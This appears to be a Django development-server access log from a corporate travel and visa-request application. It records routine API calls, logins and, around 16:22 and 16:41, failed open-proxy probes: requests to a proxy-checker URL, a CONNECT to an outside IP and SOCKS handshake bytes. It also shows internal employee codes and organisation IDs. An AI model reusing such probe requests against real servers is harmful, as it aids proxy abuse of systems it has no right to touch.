+INFO|05/May/2021 15:54:51|basehttp|2325|140367441684224|"GET /get_travel_request_approver_top/?emp_email=div944&travel_req_status=2&type=Travel&org_id=ORG150866&limit=5 HTTP/1.1" 200 48
+INFO|05/May/2021 15:54:51|basehttp|2325|140367411525376|"GET /getemployee_passport_info/?employee=div944 HTTP/1.1" 200 805
+INFO|05/May/2021 15:54:51|basehttp|2325|140367411525376|"GET /get_travel_count_user/?emp_code=div944 HTTP/1.1" 200 84
+INFO|05/May/2021 15:54:52|basehttp|2325|140367685498624|"GET /org_travel_request/?travel_req_status=2&org_id=ORG150866&current_ticket_email=div944 HTTP/1.1" 200 20141
+INFO|05/May/2021 15:54:52|basehttp|2325|140367450076928|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=div944 HTTP/1.1" 200 43838
+INFO|05/May/2021 15:55:02|basehttp|2325|140367450076928|"OPTIONS /get_view_travel_request/?travel_req_id=TR548147&org_id=ORG150866 HTTP/1.1" 200 0
+INFO|05/May/2021 15:55:02|basehttp|2325|140367411525376|"OPTIONS /get_travel_status_summary/?travel_req_id=TR548147&org_id=ORG150866 HTTP/1.1" 200 0
+INFO|05/May/2021 15:55:02|basehttp|2325|140367441684224|"OPTIONS /assignment_travel_request_status/?travel_req_id=TR548147&org_id=ORG150866 HTTP/1.1" 200 0
+INFO|05/May/2021 15:55:02|basehttp|2325|140367450076928|"GET /get_vendors_type/ HTTP/1.1" 200 7881
+INFO|05/May/2021 15:55:02|basehttp|2325|140367685498624|"GET /get_active_currency/?status_type=Active HTTP/1.1" 200 12552
+INFO|05/May/2021 15:55:02|basehttp|2325|140367411525376|"GET /get_action_status/?module=T, HTTP/1.1" 200 2108
+INFO|05/May/2021 15:55:02|basehttp|2325|140367428572928|"GET /assignment_travel_request_status/?travel_req_id=TR548147&org_id=ORG150866 HTTP/1.1" 200 775
+INFO|05/May/2021 15:55:02|basehttp|2325|140367441684224|"GET /get_view_travel_request/?travel_req_id=TR548147&org_id=ORG150866 HTTP/1.1" 200 2741
+INFO|05/May/2021 15:55:02|basehttp|2325|140367450076928|"GET /get_travel_status_summary/?travel_req_id=TR548147&org_id=ORG150866 HTTP/1.1" 200 1095
+INFO|05/May/2021 15:55:02|basehttp|2325|140367441684224|"GET /get_add/vendor/?vendor_type=2&org_id=ORG150866 HTTP/1.1" 200 2826
+INFO|05/May/2021 15:55:02|basehttp|2325|140367450076928|"POST /get_vendors_category/ HTTP/1.1" 200 3845
+INFO|05/May/2021 15:55:02|basehttp|2325|140367428572928|"OPTIONS /get_create_assignment/?home=United%20States&End_date=2021-04-09T12:50:29.841000+05:30&Start_date=Fri%20Apr%2009%202021%2000:00:00%20GMT+0530%20(India%20Standard%20Time)&emp_code=tushaar001 HTTP/1.1" 200 0
+INFO|05/May/2021 15:55:02|basehttp|2325|140367441684224|"GET /active_taxgrid/?org=ORG150866 HTTP/1.1" 200 9440
+INFO|05/May/2021 15:55:02|basehttp|2325|140367441684224|"GET /get_post_location/?country=United%20States&org_id=ORG150866 HTTP/1.1" 200 838
+INFO|05/May/2021 15:55:03|basehttp|2325|140367441684224|"GET /get_currency_conversion/?from_currency=USD&to_currency= HTTP/1.1" 200 63
+INFO|05/May/2021 15:55:03|basehttp|2325|140367428572928|"GET /get_create_assignment/?home=United%20States&End_date=2021-04-09T12:50:29.841000+05:30&Start_date=Fri%20Apr%2009%202021%2000:00:00%20GMT+0530%20(India%20Standard%20Time)&emp_code=tushaar001 HTTP/1.1" 200 63
+INFO|05/May/2021 15:55:07|basehttp|2325|140367428572928|"OPTIONS /employee_chat/?sender_emp_code=div944&receiver_emp_code=VN14&ticket_id=TR548147 HTTP/1.1" 200 0
+INFO|05/May/2021 15:55:07|basehttp|2325|140367428572928|"GET /employee_chat/?sender_emp_code=div944&receiver_emp_code=VN14&ticket_id=TR548147 HTTP/1.1" 200 221
+INFO|05/May/2021 15:55:14|basehttp|2325|140367428572928|"GET /employee_chat/?sender_emp_code=div944&receiver_emp_code=VN14&ticket_id=TR548147 HTTP/1.1" 200 221
+INFO|05/May/2021 15:55:16|basehttp|2325|140367428572928|"OPTIONS /employee_chat/?sender_emp_code=div944&receiver_emp_code=undefined&ticket_id=TR548147 HTTP/1.1" 200 0
+INFO|05/May/2021 15:55:16|basehttp|2325|140367428572928|"GET /employee_chat/?sender_emp_code=div944&receiver_emp_code=undefined&ticket_id=TR548147 HTTP/1.1" 200 55
+INFO|05/May/2021 15:55:19|basehttp|2325|140367428572928|"GET /employee_chat/?sender_emp_code=div944&receiver_emp_code=undefined&ticket_id=TR548147 HTTP/1.1" 200 55
+INFO|05/May/2021 15:55:21|basehttp|2325|140367428572928|"GET /employee_chat/?sender_emp_code=div944&receiver_emp_code=undefined&ticket_id=TR548147 HTTP/1.1" 200 55
+INFO|05/May/2021 15:55:22|basehttp|2325|140367428572928|"GET /employee_chat/?sender_emp_code=div944&receiver_emp_code=undefined&ticket_id=TR548147 HTTP/1.1" 200 55
+INFO|05/May/2021 15:55:23|basehttp|2325|140367428572928|"GET /employee_chat/?sender_emp_code=div944&receiver_emp_code=VN14&ticket_id=TR548147 HTTP/1.1" 200 221
+INFO|05/May/2021 15:55:24|basehttp|2325|140367428572928|"GET /employee_chat/?sender_emp_code=div944&receiver_emp_code=undefined&ticket_id=TR548147 HTTP/1.1" 200 55
+INFO|05/May/2021 15:55:45|basehttp|2325|140367428572928|"GET /get_org_count_visa_requests/?org_id=ORG150866 HTTP/1.1" 200 77
+INFO|05/May/2021 15:55:45|basehttp|2325|140367428572928|"GET /get_org_count_travel_requests/?org_id=ORG150866 HTTP/1.1" 200 78
+INFO|05/May/2021 15:55:47|basehttp|2325|140367441684224|"OPTIONS /get_vendors/?org_id=ORG150866 HTTP/1.1" 200 0
+INFO|05/May/2021 15:55:47|basehttp|2325|140367428572928|"OPTIONS /get_add/country/ HTTP/1.1" 200 0
+INFO|05/May/2021 15:55:47|basehttp|2325|140367450076928|"GET /get_vendors_type/ HTTP/1.1" 200 7881
+INFO|05/May/2021 15:55:47|basehttp|2325|140367450076928|"GET /get_vendors/?org_id=ORG150866 HTTP/1.1" 200 43203
+INFO|05/May/2021 15:55:47|basehttp|2325|140367428572928|"GET /get_add/country/ HTTP/1.1" 200 114687
+INFO|05/May/2021 15:56:06|basehttp|2325|140367450076928|"GET /get_travel_request_approver_top/?emp_email=div944&travel_req_status=2&type=Travel&org_id=ORG150866&limit=5 HTTP/1.1" 200 48
+INFO|05/May/2021 15:56:06|basehttp|2325|140367441684224|"GET /getemployee_visa_info/?employee=div944 HTTP/1.1" 200 43
+INFO|05/May/2021 15:56:06|basehttp|2325|140367685498624|"GET /post_get_calender_event/?emp_code=div944 HTTP/1.1" 200 48
+INFO|05/May/2021 15:56:06|basehttp|2325|140367411525376|"GET /getemployee_passport_info/?employee=div944 HTTP/1.1" 200 805
+INFO|05/May/2021 15:56:06|basehttp|2325|140367411525376|"GET /get_travel_count_user/?emp_code=div944 HTTP/1.1" 200 84
+INFO|05/May/2021 15:56:07|basehttp|2325|140367450076928|"GET /org_travel_request/?travel_req_status=2&org_id=ORG150866&current_ticket_email=div944 HTTP/1.1" 200 20141
+INFO|05/May/2021 15:56:07|basehttp|2325|140367428572928|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=div944 HTTP/1.1" 200 43838
+INFO|05/May/2021 15:56:11|basehttp|2325|140367411525376|"GET /get_vendors_type/ HTTP/1.1" 200 7881
+INFO|05/May/2021 15:56:11|basehttp|2325|140367428572928|"GET /get_action_status/?module=T, HTTP/1.1" 200 2108
+INFO|05/May/2021 15:56:11|basehttp|2325|140367450076928|"GET /assignment_travel_request_status/?travel_req_id=TR548147&org_id=ORG150866 HTTP/1.1" 200 775
+INFO|05/May/2021 15:56:11|basehttp|2325|140367441684224|"GET /get_active_currency/?status_type=Active HTTP/1.1" 200 12552
+INFO|05/May/2021 15:56:11|basehttp|2325|140367685498624|"GET /get_view_travel_request/?travel_req_id=TR548147&org_id=ORG150866 HTTP/1.1" 200 2741
+INFO|05/May/2021 15:56:11|basehttp|2325|140367419918080|"GET /get_travel_status_summary/?travel_req_id=TR548147&org_id=ORG150866 HTTP/1.1" 200 1095
+INFO|05/May/2021 15:56:11|basehttp|2325|140367419918080|"GET /get_add/vendor/?vendor_type=2&org_id=ORG150866 HTTP/1.1" 200 2826
+INFO|05/May/2021 15:56:11|basehttp|2325|140367685498624|"POST /get_vendors_category/ HTTP/1.1" 200 3845
+INFO|05/May/2021 15:56:11|basehttp|2325|140367419918080|"GET /active_taxgrid/?org=ORG150866 HTTP/1.1" 200 9440
+INFO|05/May/2021 15:56:11|basehttp|2325|140367441684224|"GET /get_post_location/?country=United%20States&org_id=ORG150866 HTTP/1.1" 200 838
+INFO|05/May/2021 15:56:11|basehttp|2325|140367450076928|"GET /get_create_assignment/?home=United%20States&End_date=2021-04-09T12:50:29.841000+05:30&Start_date=Fri%20Apr%2009%202021%2000:00:00%20GMT+0530%20(India%20Standard%20Time)&emp_code=tushaar001 HTTP/1.1" 200 63
+INFO|05/May/2021 15:56:11|basehttp|2325|140367419918080|"GET /get_currency_conversion/?from_currency=USD&to_currency= HTTP/1.1" 200 63
+INFO|05/May/2021 15:56:12|basehttp|2325|140367419918080|"GET /employee_chat/?sender_emp_code=div944&receiver_emp_code=VN14&ticket_id=TR548147 HTTP/1.1" 200 221
+INFO|05/May/2021 15:56:16|basehttp|2325|140367419918080|"GET /employee_chat/?sender_emp_code=div944&receiver_emp_code=undefined&ticket_id=TR548147 HTTP/1.1" 200 55
+INFO|05/May/2021 15:56:20|basehttp|2325|140367419918080|"GET /employee_chat/?sender_emp_code=div944&receiver_emp_code=undefined&ticket_id=TR548147 HTTP/1.1" 200 55
+INFO|05/May/2021 15:56:22|basehttp|2325|140367419918080|"GET /employee_chat/?sender_emp_code=div944&receiver_emp_code=VN14&ticket_id=TR548147 HTTP/1.1" 200 221
+INFO|05/May/2021 15:56:28|basehttp|2325|140367419918080|"GET /employee_chat/?sender_emp_code=div944&receiver_emp_code=undefined&ticket_id=TR548147 HTTP/1.1" 200 55
+INFO|05/May/2021 15:56:33|basehttp|2325|140367419918080|"GET /employee_chat/?sender_emp_code=div944&receiver_emp_code=VN14&ticket_id=TR548147 HTTP/1.1" 200 221
+INFO|05/May/2021 15:56:35|basehttp|2325|140367441684224|"GET /get_travel_request_approver_top/?emp_email=div944&travel_req_status=2&type=Travel&org_id=ORG150866&limit=5 HTTP/1.1" 200 48
+INFO|05/May/2021 15:56:35|basehttp|2325|140367428572928|"GET /getemployee_visa_info/?employee=div944 HTTP/1.1" 200 43
+INFO|05/May/2021 15:56:35|basehttp|2325|140367450076928|"GET /getemployee_passport_info/?employee=div944 HTTP/1.1" 200 805
+INFO|05/May/2021 15:56:35|basehttp|2325|140367411525376|"GET /post_get_calender_event/?emp_code=div944 HTTP/1.1" 200 48
+INFO|05/May/2021 15:56:36|basehttp|2325|140367411525376|"GET /get_travel_count_user/?emp_code=div944 HTTP/1.1" 200 84
+INFO|05/May/2021 15:56:36|basehttp|2325|140367685498624|"GET /org_travel_request/?travel_req_status=2&org_id=ORG150866&current_ticket_email=div944 HTTP/1.1" 200 20141
+INFO|05/May/2021 15:56:36|basehttp|2325|140367419918080|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=div944 HTTP/1.1" 200 43838
+INFO|05/May/2021 15:56:44|basehttp|2325|140367685498624|"OPTIONS /assignment_travel_request_status/?travel_req_id=TR669268&org_id=ORG150866 HTTP/1.1" 200 0
+INFO|05/May/2021 15:56:44|basehttp|2325|140367411525376|"OPTIONS /get_view_travel_request/?travel_req_id=TR669268&org_id=ORG150866 HTTP/1.1" 200 0
+INFO|05/May/2021 15:56:44|basehttp|2325|140367685498624|"OPTIONS /get_travel_status_summary/?travel_req_id=TR669268&org_id=ORG150866 HTTP/1.1" 200 0
+INFO|05/May/2021 15:56:45|basehttp|2325|140367419918080|"GET /get_vendors_type/ HTTP/1.1" 200 7881
+INFO|05/May/2021 15:56:45|basehttp|2325|140367411525376|"GET /get_action_status/?module=T, HTTP/1.1" 200 2108
+INFO|05/May/2021 15:56:45|basehttp|2325|140367685498624|"GET /get_active_currency/?status_type=Active HTTP/1.1" 200 12552
+INFO|05/May/2021 15:56:45|basehttp|2325|140367411525376|"GET /get_view_travel_request/?travel_req_id=TR669268&org_id=ORG150866 HTTP/1.1" 200 2765
+INFO|05/May/2021 15:56:45|basehttp|2325|140367685498624|"GET /get_travel_status_summary/?travel_req_id=TR669268&org_id=ORG150866 HTTP/1.1" 200 967
+INFO|05/May/2021 15:56:45|basehttp|2325|140367419918080|"GET /assignment_travel_request_status/?travel_req_id=TR669268&org_id=ORG150866 HTTP/1.1" 200 12536
+INFO|05/May/2021 15:56:45|basehttp|2325|140367419918080|"OPTIONS /get_post_location/?country=United%20Kingdom&org_id=ORG150866 HTTP/1.1" 200 0
+INFO|05/May/2021 15:56:45|basehttp|2325|140367411525376|"OPTIONS /get_create_assignment/?home=United%20Kingdom&End_date=2021-06-30T00:00:00+05:30&Start_date=Tue%20Feb%2009%202021%2000:00:00%20GMT+0530%20(India%20Standard%20Time)&emp_code=div944 HTTP/1.1" 200 0
+INFO|05/May/2021 15:56:45|basehttp|2325|140367685498624|"OPTIONS /get_currency_conversion/?from_currency=GBP&to_currency=USD HTTP/1.1" 200 0
+INFO|05/May/2021 15:56:45|basehttp|2325|140367450076928|"GET /active_taxgrid/?org=ORG150866 HTTP/1.1" 200 9440
+INFO|05/May/2021 15:56:45|basehttp|2325|140367450076928|"GET /get_create_assignment/?home=United%20Kingdom&End_date=2021-06-30T00:00:00+05:30&Start_date=Tue%20Feb%2009%202021%2000:00:00%20GMT+0530%20(India%20Standard%20Time)&emp_code=div944 HTTP/1.1" 200 63
+INFO|05/May/2021 15:56:45|basehttp|2325|140367685498624|"GET /get_post_location/?country=United%20Kingdom&org_id=ORG150866 HTTP/1.1" 200 803
+INFO|05/May/2021 15:56:45|basehttp|2325|140367411525376|"GET /get_currency_conversion/?from_currency=GBP&to_currency=USD HTTP/1.1" 200 572
+INFO|05/May/2021 15:56:46|basehttp|2325|140367411525376|"OPTIONS /employee_chat/?sender_emp_code=div944&receiver_emp_code=undefined&ticket_id=TR669268 HTTP/1.1" 200 0
+INFO|05/May/2021 15:56:46|basehttp|2325|140367411525376|"GET /employee_chat/?sender_emp_code=div944&receiver_emp_code=undefined&ticket_id=TR669268 HTTP/1.1" 200 55
+INFO|05/May/2021 15:56:47|basehttp|2325|140367411525376|"GET /employee_chat/?sender_emp_code=div944&receiver_emp_code=undefined&ticket_id=TR669268 HTTP/1.1" 200 55
+INFO|05/May/2021 15:56:49|basehttp|2325|140367411525376|"GET /employee_chat/?sender_emp_code=div944&receiver_emp_code=undefined&ticket_id=TR669268 HTTP/1.1" 200 55
+INFO|05/May/2021 15:56:51|basehttp|2325|140367685498624|"OPTIONS /get_add/vendor/?vendor_type=14&org_id=ORG150866 HTTP/1.1" 200 0
+INFO|05/May/2021 15:56:51|basehttp|2325|140367411525376|"POST /get_vendors_category/ HTTP/1.1" 200 63
+INFO|05/May/2021 15:56:51|basehttp|2325|140367411525376|"GET /get_add/vendor/?vendor_type=14&org_id=ORG150866 HTTP/1.1" 200 2169
+INFO|05/May/2021 15:56:56|basehttp|2325|140367411525376|"GET /employee_chat/?sender_emp_code=div944&receiver_emp_code=undefined&ticket_id=TR669268 HTTP/1.1" 200 55
+INFO|05/May/2021 15:56:58|basehttp|2325|140367411525376|"OPTIONS /get_add/vendor/?vendor_type=9&org_id=ORG150866 HTTP/1.1" 200 0
+INFO|05/May/2021 15:56:58|basehttp|2325|140367685498624|"POST /get_vendors_category/ HTTP/1.1" 200 3868
+INFO|05/May/2021 15:56:58|basehttp|2325|140367685498624|"GET /get_add/vendor/?vendor_type=9&org_id=ORG150866 HTTP/1.1" 200 2808
+INFO|05/May/2021 15:57:02|basehttp|2325|140367685498624|"GET /employee_chat/?sender_emp_code=div944&receiver_emp_code=undefined&ticket_id=TR669268 HTTP/1.1" 200 55
+INFO|05/May/2021 15:57:07|basehttp|2325|140367685498624|"GET /employee_chat/?sender_emp_code=div944&receiver_emp_code=undefined&ticket_id=TR669268 HTTP/1.1" 200 55
+INFO|05/May/2021 15:57:09|basehttp|2325|140367685498624|"POST /assignment_travel_request_status/?travel_req_id=TR669268&org_id=ORG150866 HTTP/1.1" 200 72
+INFO|05/May/2021 15:57:42|basehttp|2325|140367419918080|"GET /getemployee_visa_info/?employee=div944 HTTP/1.1" 200 43
+INFO|05/May/2021 15:57:42|basehttp|2325|140367441684224|"GET /get_travel_request_approver_top/?emp_email=div944&travel_req_status=2&type=Travel&org_id=ORG150866&limit=5 HTTP/1.1" 200 48
+INFO|05/May/2021 15:57:42|basehttp|2325|140367428572928|"GET /post_get_calender_event/?emp_code=div944 HTTP/1.1" 200 48
+INFO|05/May/2021 15:57:42|basehttp|2325|140367411525376|"GET /getemployee_passport_info/?employee=div944 HTTP/1.1" 200 805
+INFO|05/May/2021 15:57:42|basehttp|2325|140367411525376|"GET /get_travel_count_user/?emp_code=div944 HTTP/1.1" 200 84
+INFO|05/May/2021 15:57:43|basehttp|2325|140367450076928|"GET /org_travel_request/?travel_req_status=2&org_id=ORG150866&current_ticket_email=div944 HTTP/1.1" 200 20141
+INFO|05/May/2021 15:57:43|basehttp|2325|140367685498624|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=div944 HTTP/1.1" 200 43838
+INFO|05/May/2021 15:58:23|basehttp|2325|140367685498624|"GET / HTTP/1.1" 200 45
+INFO|05/May/2021 15:59:53|basehttp|2325|140367685498624|"POST /api/custom/login/ HTTP/1.1" 200 452
+INFO|05/May/2021 15:59:53|basehttp|2325|140367685498624|"POST /emoloyeeinfo/ HTTP/1.1" 200 1387
+INFO|05/May/2021 15:59:54|basehttp|2325|140367685498624|"OPTIONS /get_post_notification/?email=super001&org_id=ORG150866 HTTP/1.1" 200 0
+INFO|05/May/2021 15:59:54|basehttp|2325|140367450076928|"OPTIONS /getemployee_org_info/?employee=super001 HTTP/1.1" 200 0
+INFO|05/May/2021 15:59:54|basehttp|2325|140367450076928|"OPTIONS /orgcount/ HTTP/1.1" 200 0
+INFO|05/May/2021 15:59:54|basehttp|2325|140367450076928|"GET /getemployee_org_info/?employee=super001 HTTP/1.1" 200 43
+INFO|05/May/2021 15:59:54|basehttp|2325|140367685498624|"GET /get_post_notification/?email=super001&org_id=ORG150866 HTTP/1.1" 200 63
+INFO|05/May/2021 15:59:54|basehttp|2325|140367685498624|"GET /orgcount/ HTTP/1.1" 200 83
+INFO|05/May/2021 15:59:56|basehttp|2325|140367685498624|"OPTIONS /organisations-list/ HTTP/1.1" 200 0
+INFO|05/May/2021 15:59:56|basehttp|2325|140367685498624|"GET /organisations-list/ HTTP/1.1" 200 6159
+INFO|05/May/2021 16:00:08|basehttp|2325|140367685498624|"GET /organisations-list/ HTTP/1.1" 200 6159
+INFO|05/May/2021 16:00:17|basehttp|2325|140367685498624|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|05/May/2021 16:00:21|basehttp|2325|140367685498624|"OPTIONS /editorganisation/?id=7 HTTP/1.1" 200 0
+INFO|05/May/2021 16:00:21|basehttp|2325|140367685498624|"POST /editorganisation/?id=7 HTTP/1.1" 201 804
+INFO|05/May/2021 16:00:23|basehttp|2325|140367685498624|"GET /organisations-list/ HTTP/1.1" 200 6160
+INFO|05/May/2021 16:00:31|basehttp|2325|140367685498624|"GET /orgcount/ HTTP/1.1" 200 83
+INFO|05/May/2021 16:00:35|basehttp|2325|140367685498624|"GET /organisations-list/ HTTP/1.1" 200 6160
+INFO|05/May/2021 16:01:03|basehttp|2325|140367685498624|"GET /organisations-list/ HTTP/1.1" 200 6160
+INFO|05/May/2021 16:01:07|basehttp|2325|140367685498624|"GET /orgcount/ HTTP/1.1" 200 83
+INFO|05/May/2021 16:01:11|basehttp|2325|140367685498624|"OPTIONS /userlist/ HTTP/1.1" 200 0
+INFO|05/May/2021 16:01:11|basehttp|2325|140367685498624|"GET /userlist/ HTTP/1.1" 200 328
+INFO|05/May/2021 16:01:16|basehttp|2325|140367685498624|"GET /orgcount/ HTTP/1.1" 200 83
+INFO|05/May/2021 16:01:17|basehttp|2325|140367685498624|"GET /userlist/ HTTP/1.1" 200 328
+INFO|05/May/2021 16:01:45|basehttp|2325|140367685498624|"GET /getemployee_org_info/?employee=super001 HTTP/1.1" 200 43
+INFO|05/May/2021 16:01:45|basehttp|2325|140367450076928|"GET /get_post_notification/?email=super001&org_id=ORG150866 HTTP/1.1" 200 63
+INFO|05/May/2021 16:01:45|basehttp|2325|140367450076928|"GET /userlist/ HTTP/1.1" 200 328
+INFO|05/May/2021 16:02:32|basehttp|2325|140367450076928|"GET /organisations-list/ HTTP/1.1" 200 6160
+INFO|05/May/2021 16:02:47|basehttp|2325|140367450076928|"GET /orgcount/ HTTP/1.1" 200 83
+INFO|05/May/2021 16:02:55|basehttp|2325|140367450076928|"POST /api/custom/login/ HTTP/1.1" 200 455
+INFO|05/May/2021 16:02:55|basehttp|2325|140367450076928|"POST /emoloyeeinfo/ HTTP/1.1" 200 1526
+INFO|05/May/2021 16:02:55|basehttp|2325|140367685498624|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 200 43
+INFO|05/May/2021 16:02:55|basehttp|2325|140367441684224|"GET /get_travel_request_approver_top/?emp_email=div944&travel_req_status=2&type=Travel&org_id=ORG150866&limit=5 HTTP/1.1" 200 48
+INFO|05/May/2021 16:02:55|basehttp|2325|140367685498624|"GET /getemployee_passport_info/?employee=div944 HTTP/1.1" 200 805
+INFO|05/May/2021 16:02:55|basehttp|2325|140367450076928|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 7386
+INFO|05/May/2021 16:02:56|basehttp|2325|140367450076928|"GET /getemployee_visa_info/?employee=div944 HTTP/1.1" 200 43
+INFO|05/May/2021 16:02:56|basehttp|2325|140367685498624|"GET /post_get_calender_event/?emp_code=div944 HTTP/1.1" 200 48
+INFO|05/May/2021 16:02:56|basehttp|2325|140367450076928|"GET /get_travel_count_user/?emp_code=div944 HTTP/1.1" 200 84
+INFO|05/May/2021 16:02:56|basehttp|2325|140367428572928|"GET /org_travel_request/?travel_req_status=2&org_id=ORG150866&current_ticket_email=div944 HTTP/1.1" 200 20141
+INFO|05/May/2021 16:02:57|basehttp|2325|140367411525376|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=div944 HTTP/1.1" 200 43838
+INFO|05/May/2021 16:03:00|basehttp|2325|140367411525376|"GET /get_org_count_visa_requests/?org_id=ORG150866 HTTP/1.1" 200 77
+INFO|05/May/2021 16:03:00|basehttp|2325|140367428572928|"GET /get_org_count_travel_requests/?org_id=ORG150866 HTTP/1.1" 200 78
+INFO|05/May/2021 16:03:02|basehttp|2325|140367685498624|"GET /get_post_relation/ HTTP/1.1" 200 2061
+INFO|05/May/2021 16:03:02|basehttp|2325|140367441684224|"GET /get_post_gender/ HTTP/1.1" 200 2067
+INFO|05/May/2021 16:03:02|basehttp|2325|140367419918080|"GET /get_post_phone/ HTTP/1.1" 200 2088
+INFO|05/May/2021 16:03:02|basehttp|2325|140367411525376|"GET /getemployee_personal_info/?employee=div944 HTTP/1.1" 200 1513
+INFO|05/May/2021 16:03:02|basehttp|2325|140367450076928|"GET /get_dial_code/?dial_code= HTTP/1.1" 200 57031
+INFO|05/May/2021 16:03:02|basehttp|2325|140367428572928|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|05/May/2021 16:03:02|basehttp|2325|140367428572928|"GET /get_post_email/ HTTP/1.1" 200 1280
+INFO|05/May/2021 16:03:02|basehttp|2325|140367428572928|"GET /get_post_marital_status/ HTTP/1.1" 200 4588
+INFO|05/May/2021 16:03:02|basehttp|2325|140367411525376|"GET /get_post_salutation/ HTTP/1.1" 200 2049
+INFO|05/May/2021 16:03:02|basehttp|2325|140367450076928|"GET /get_post_suffix/ HTTP/1.1" 200 2838
+INFO|05/May/2021 16:03:02|basehttp|2325|140367450076928|"GET /get_post_address/ HTTP/1.1" 200 1276
+INFO|05/May/2021 16:03:13|basehttp|2325|140367450076928|"GET /get_org_count_visa_requests/?org_id=ORG150866 HTTP/1.1" 200 77
+INFO|05/May/2021 16:03:13|basehttp|2325|140367411525376|"GET /get_org_count_travel_requests/?org_id=ORG150866 HTTP/1.1" 200 78
+INFO|05/May/2021 16:03:15|basehttp|2325|140367411525376|"GET /get_post_salutation/ HTTP/1.1" 200 2049
+INFO|05/May/2021 16:03:15|basehttp|2325|140367419918080|"GET /get_post_gender/ HTTP/1.1" 200 2067
+INFO|05/May/2021 16:03:15|basehttp|2325|140367450076928|"GET /get_post_marital_status/ HTTP/1.1" 200 4588
+INFO|05/May/2021 16:03:15|basehttp|2325|140367428572928|"GET /get_post_suffix/ HTTP/1.1" 200 2838
+INFO|05/May/2021 16:03:15|basehttp|2325|140367685498624|"GET /get_post_address/ HTTP/1.1" 200 1276
+INFO|05/May/2021 16:03:15|basehttp|2325|140367441684224|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|05/May/2021 16:03:15|basehttp|2325|140367441684224|"GET /get_post_phone/ HTTP/1.1" 200 2088
+INFO|05/May/2021 16:03:15|basehttp|2325|140367428572928|"GET /get_post_email/ HTTP/1.1" 200 1280
+INFO|05/May/2021 16:03:16|basehttp|2325|140367428572928|"GET /get_post_relation/ HTTP/1.1" 200 2061
+INFO|05/May/2021 16:03:16|basehttp|2325|140367441684224|"GET /get_dial_code/?dial_code= HTTP/1.1" 200 57031
+WARNING|05/May/2021 16:22:00|log|2325|140367441684224|Not Found: /http:/check.best-proxies.ru/azenv.php
+WARNING|05/May/2021 16:22:00|basehttp|2325|140367441684224|"POST http://check.best-proxies.ru/azenv.php?s=VJVJVOIJPEOONJTCPEKEVONRIOVOYR HTTP/1.1" 404 1762
+WARNING|05/May/2021 16:22:04|log|2325|140367441684224|Not Found: /5.178.86.76:80
+WARNING|05/May/2021 16:22:04|basehttp|2325|140367441684224|"CONNECT 5.178.86.76:80 HTTP/1.1" 404 1664
+INFO|05/May/2021 16:22:14|basehttp|2325|140367441684224|code 400, message Bad request syntax ('\x04\x01\x00P\x05²VL0\x00')
+WARNING|05/May/2021 16:22:14|basehttp|2325|140367441684224|" P²VL0 " 400 -
+INFO|05/May/2021 16:22:14|basehttp|2325|140367441684224|- Broken pipe from ('5.178.86.76', 55705)
+
+INFO|05/May/2021 16:22:19|basehttp|2325|140367441684224|code 400, message Bad request syntax ('\x05\x01\x00')
+WARNING|05/May/2021 16:22:19|basehttp|2325|140367441684224|" " 400 -
+INFO|05/May/2021 16:22:19|basehttp|2325|140367441684224|- Broken pipe from ('5.178.86.74', 24121)
+
+INFO|05/May/2021 16:22:23|basehttp|2325|140367441684224|"GET / HTTP/1.1" 200 40
+WARNING|05/May/2021 16:41:09|log|2325|140367441684224|Not Found: /http:/check.best-proxies.ru/azenv.php
+WARNING|05/May/2021 16:41:09|basehttp|2325|140367441684224|"POST http://check.best-proxies.ru/azenv.php?s=VJVJVOIJPEOONJTCPENENUVDIOVOYR HTTP/1.1" 404 1762
+WARNING|05/May/2021 16:41:14|log|2325|140367441684224|Not Found: /5.178.86.76:80
+WARNING|05/May/2021 16:41:14|basehttp|2325|140367441684224|"CONNECT 5.178.86.76:80 HTTP/1.1" 404 1664
+INFO|05/May/2021 16:41:24|basehttp|2325|140367441684224|code 400, message Bad request syntax ('\x04\x01\x00P\x05²VL0\x00')
+WARNING|05/May/2021 16:41:24|basehttp|2325|140367441684224|" P²VL0 " 400 -
+INFO|05/May/2021 16:41:24|basehttp|2325|140367441684224|- Broken pipe from ('5.178.86.74', 59915)
+
+INFO|05/May/2021 16:41:29|basehttp|2325|140367441684224|code 400, message Bad request syntax ('\x05\x01\x00')
+WARNING|05/May/2021 16:41:29|basehttp|2325|140367441684224|" " 400 -
+INFO|05/May/2021 16:46:35|basehttp|2325|140367441684224|"OPTIONS /getemployee_org_info/?employee=div944 HTTP/1.1" 200 0
+INFO|05/May/2021 16:46:35|basehttp|2325|140367428572928|"OPTIONS /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 0
+WARNING|05/May/2021 16:46:35|log|2325|140367428572928|Unauthorized: /get_post_notification/
+WARNING|05/May/2021 16:46:35|basehttp|2325|140367428572928|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 401 58
+WARNING|05/May/2021 16:46:35|log|2325|140367441684224|Unauthorized: /getemployee_org_info/
+WARNING|05/May/2021 16:46:35|basehttp|2325|140367441684224|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 401 58
+INFO|05/May/2021 17:17:28|basehttp|12720|140367651403520|"POST /api/custom/login/ HTTP/1.1" 200 455
+INFO|05/May/2021 17:23:47|basehttp|12957|140371296339712|"POST /api/custom/login/ HTTP/1.1" 200 455
+INFO|05/May/2021 17:39:46|basehttp|12957|140371296339712|"POST /api/custom/login/ HTTP/1.1" 200 455
+INFO|05/May/2021 17:42:42|basehttp|12957|140371296339712|"POST /api/custom/login/ HTTP/1.1" 200 455
+INFO|05/May/2021 17:52:03|basehttp|12957|140371296339712|"OPTIONS /api/custom/login/ HTTP/1.1" 200 0
+INFO|05/May/2021 17:52:04|basehttp|12957|140371296339712|"POST /api/custom/login/ HTTP/1.1" 200 452
+INFO|05/May/2021 17:52:04|basehttp|12957|140371296339712|"OPTIONS /emoloyeeinfo/ HTTP/1.1" 200 0
